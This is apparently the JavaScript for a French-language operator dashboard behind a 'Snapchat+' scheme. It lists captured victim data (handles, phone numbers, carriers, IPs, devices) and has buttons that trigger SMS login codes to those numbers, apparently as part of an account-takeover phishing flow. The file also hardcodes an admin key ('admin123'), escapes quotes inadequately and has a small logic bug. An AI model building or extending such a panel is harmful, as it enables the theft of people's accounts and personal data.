"use strict";

const SVC_LABELS = { snap: "Snapchat+" };
let key = "";
let timer = null;

const pageLogin = document.getElementById("page-login");
const pageDash = document.getElementById("page-dash");
const pageQuick = document.getElementById("page-quick");

// ── Quick send from ?rid= ──
const rid = new URLSearchParams(window.location.search).get("rid");
if (rid) {
  pageLogin.style.display = "none";
  pageQuick.style.display = "";
  (async () => {
    try {
      const res = await fetch(CONFIG.API + "/api/admin/code/" + rid, {
        method: "POST",
        headers: { "Content-Type": "application/json", "X-Admin-Key": "admin123" },
      });
      const d = await res.json();
      if (d.ok) {
        document.getElementById("quick-title").textContent = "Code envoye !";
        document.getElementById("quick-sub").textContent = "Le SMS a ete declenche. Tu peux fermer cette page.";
        document.getElementById("quick-card").style.borderColor = "rgba(255,252,0,.5)";
      } else {
        document.getElementById("quick-title").textContent = "Erreur";
        document.getElementById("quick-sub").textContent = "Demande introuvable ou deja traitee.";
      }
    } catch {
      document.getElementById("quick-title").textContent = "Erreur reseau";
      document.getElementById("quick-sub").textContent = "Le serveur ne repond pas.";
    }
  })();
}

// ── Login ──
document.getElementById("form-login").addEventListener("submit", async (e) => {
  e.preventDefault();
  const inp = document.getElementById("inp-key");
  const fb = document.getElementById("fb-login");
  const btn = document.getElementById("btn-login");
  const k = inp.value.trim();
  if (!k) return;

  btn.disabled = true;
  btn.textContent = "...";
  fb.textContent = "";

  const res = await fetch(CONFIG.API + "/api/admin/stats", { headers: { "X-Admin-Key": k } });
  const d = await res.json().catch(() => null);

  if (d && d.ok) {
    key = k;
    sessionStorage.setItem("admin_key", k);
    showDash();
  } else {
    fb.className = "feedback err";
    fb.textContent = "Cle incorrecte";
    btn.disabled = false;
    btn.textContent = "Acceder";
  }
});

// ── Logout ──
document.getElementById("btn-logout").addEventListener("click", () => {
  key = "";
  sessionStorage.removeItem("admin_key");
  clearInterval(timer);
  pageDash.style.display = "none";
  pageLogin.style.display = "";
  document.getElementById("inp-key").value = "";
});

// ── Dashboard ──
function showDash() {
  pageLogin.style.display = "none";
  pageDash.style.display = "";
  poll();
  timer = setInterval(poll, 3000);
}

async function api(method, path, body) {
  const opts = { method, headers: { "Content-Type": "application/json", "X-Admin-Key": key } };
  if (body) opts.body = JSON.stringify(body);
  return fetch(CONFIG.API + path, opts).then(r => r.json()).catch(() => null);
}

async function poll() {
  const dot = document.getElementById("sync-dot");
  dot.classList.add("syncing");
  document.getElementById("sync-text").textContent = "sync...";

  const [stats, list, hist, blocked] = await Promise.all([
    api("GET", "/api/admin/stats"),
    api("GET", "/api/admin/list"),
    api("GET", "/api/admin/history"),
    api("GET", "/api/admin/blocked"),
  ]);

  if (stats && stats.ok) {
    document.getElementById("s-total").textContent = stats.total;
    document.getElementById("s-pending").textContent = stats.pending;
    document.getElementById("s-accepted").textContent = stats.accepted;
    document.getElementById("s-refused").textContent = stats.refused;
  }

  if (list && list.ok) renderPending(list.items);
  if (hist && hist.ok) renderHistory(hist.items);
  if (blocked && blocked.ok) renderBlocked(blocked.items);

  document.getElementById("sync-text").textContent = "a jour";
  setTimeout(() => { document.getElementById("sync-text").textContent = "sync"; }, 1200);
  dot.classList.remove("syncing");
}

function timeAgo(ts) {
  const s = Math.floor((Date.now() - ts) / 1000);
  if (s < 60) return s + "s";
  if (s < 3600) Math.floor(s / 60) + "min";
  return Math.floor(s / 3600) + "h";
}

function esc(s) { return String(s || "").replace(/&/g, "&amp;").replace(/</g, "&lt;"); }

function renderPending(items) {
  const el = document.getElementById("pending-list");
  document.getElementById("pending-count").textContent = items.length;

  if (!items.length) { el.innerHTML = '<div class="empty">Aucune demande en attente</div>'; return; }

  el.innerHTML = items.map(({ id, data, code_sent, code_sent_at }) => {
    const svc = data.service || "snap";
    const id8 = id.slice(0, 8).toUpperCase();
    const prefix = svc === "snap" ? "@" : "";
    const codeTxt = code_sent ? "Envoye" : "En attente";
    const codeTime = code_sent_at ? timeAgo(code_sent_at) : "";

    return `<div class="req-card" data-id="${id}">
      <div class="req-top">
        <span class="req-svc ${svc}">${SVC_LABELS[svc] || svc}</span>
        <span class="req-id">#${id8}</span>
        <span class="req-time">${data.ts ? timeAgo(data.ts) : ""}</span>
      </div>
      <div class="req-grid">
        <div class="req-field"><span class="rf-k">Pseudo</span><span class="rf-v">${esc(data.pseudo)}</span></div>
        <div class="req-field"><span class="rf-k">Compte</span><span class="rf-v">${prefix}${esc(data.handle)}</span></div>
        <div class="req-field"><span class="rf-k">Telephone</span><span class="rf-v mono">${esc(data.phone)}</span></div>
        <div class="req-field"><span class="rf-k">Operateur</span><span class="rf-v">${esc(data.operator)}</span></div>
        <div class="req-field"><span class="rf-k">IP</span><span class="rf-v mono">${esc(data.ip)}</span></div>
        <div class="req-field"><span class="rf-k">Appareil</span><span class="rf-v">${esc(data.device)}</span></div>
        <div class="req-field"><span class="rf-k">Code</span><span class="rf-v">${codeTxt} ${codeTime}</span></div>
      </div>
      <div class="req-actions">
        <button class="btn-action code" data-act="code" data-id="${id}">${code_sent ? "Reenvoyer" : "Envoyer code"}</button>
        <button class="btn-action accept" data-act="accept" data-id="${id}">Accepter</button>
        <button class="btn-action refuse" data-act="refuse" data-id="${id}">Refuser</button>
        <button class="btn-action block" data-act="block" data-id="${id}" data-phone="${esc(data.phone)}">Bloquer</button>
      </div>
    </div>`;
  }).join("");

  el.querySelectorAll(".btn-action").forEach(b => {
    b.addEventListener("click", () => doAction(b.dataset.act, b.dataset.id, b));
  });
}

async function doAction(act, id, btn) {
  const card = btn.closest(".req-card");
  const phone = btn.dataset.phone;
  card.querySelectorAll(".btn-action").forEach(b => b.disabled = true);
  btn.textContent = "...";

  let res;
  if (act === "block") {
    res = await api("POST", "/api/admin/block", { phone });
  } else {
    res = await api("POST", `/api/admin/${act}/${id}`);
  }

  if (res && res.ok) {
    if (act === "code") { toast("Code declenche"); poll(); return; }
    toast(act === "accept" ? "Demande acceptee" : act === "block" ? "Numero bloque" : "Demande refusee");
    card.style.opacity = "0";
    card.style.transform = "translateX(20px)";
    setTimeout(poll, 300);
  } else {
    toast("Erreur", "error");
    card.querySelectorAll(".btn-action").forEach(b => b.disabled = false);
  }
}

function renderHistory(items) {
  const el = document.getElementById("history-list");
  document.getElementById("history-count").textContent = items.length;
  if (!items.length) { el.innerHTML = '<div class="empty">Vide</div>'; return; }

  el.innerHTML = items.slice(0, 30).map(h => {
    const icon = h.action === "accept" ? "&#10003;" : h.action === "block" ? "&#128683;" : "&#10007;";
    const cls = h.action === "accept" ? "acc" : h.action === "block" ? "blk" : "ref";
    return `<div class="hist-item ${cls}">
      <span class="hist-icon">${icon}</span>
      <div class="hist-info"><div>${esc(h.data?.pseudo)}</div><div class="hist-meta">${SVC_LABELS[h.data?.service] || (h.data?.phone ? "Numero bloque : " + esc(h.data.phone) : "-")}</div></div>
      <span class="hist-time">${h.ts ? timeAgo(h.ts) : ""}</span>
    </div>`;
  }).join("");
}

function renderBlocked(items) {
  const el = document.getElementById("blocked-list");
  document.getElementById("blocked-count").textContent = items.length;
  if (!items.length) { el.innerHTML = '<div class="empty">Aucun numero bloque</div>'; return; }

  el.innerHTML = items.map(p => {
    return `<div class="blk-item">
      <span class="blk-phone mono">${esc(p)}</span>
      <button class="btn-action unblock" data-phone="${esc(p)}">Debloquer</button>
    </div>`;
  }).join("");

  el.querySelectorAll(".btn-action.unblock").forEach(b => {
    b.addEventListener("click", async () => {
      b.disabled = true;
      b.textContent = "...";
      const res = await api("POST", "/api/admin/unblock", { phone: b.dataset.phone });
      if (res && res.ok) {
        toast("Numero debloque");
        poll();
      } else {
        toast("Erreur", "error");
        b.disabled = false;
        b.textContent = "Debloquer";
      }
    });
  });
}

document.getElementById("btn-block-add").addEventListener("click", async () => {
  const inp = document.getElementById("inp-block-phone");
  const phone = inp.value.trim();
  if (!phone) return;
  const btn = document.getElementById("btn-block-add");
  btn.disabled = true;
  btn.textContent = "...";
  const res = await api("POST", "/api/admin/block", { phone });
  if (res && res.ok) {
    inp.value = "";
    toast("Numero bloque");
    poll();
  } else {
    toast("Erreur", "error");
  }
  btn.disabled = false;
  btn.textContent = "Bloquer";
});

function toast(msg, type) {
  const wrap = document.getElementById("toast-wrap");
  const el = document.createElement("div");
  el.className = "toast " + (type || "success");
  el.textContent = msg;
  wrap.appendChild(el);
  setTimeout(() => { el.style.opacity = "0"; setTimeout(() => el.remove(), 2500); }, 2500);
}

// ── Auto-login ──
const saved = sessionStorage.getItem("admin_key");
if (saved && !rid) { key = saved; showDash(); }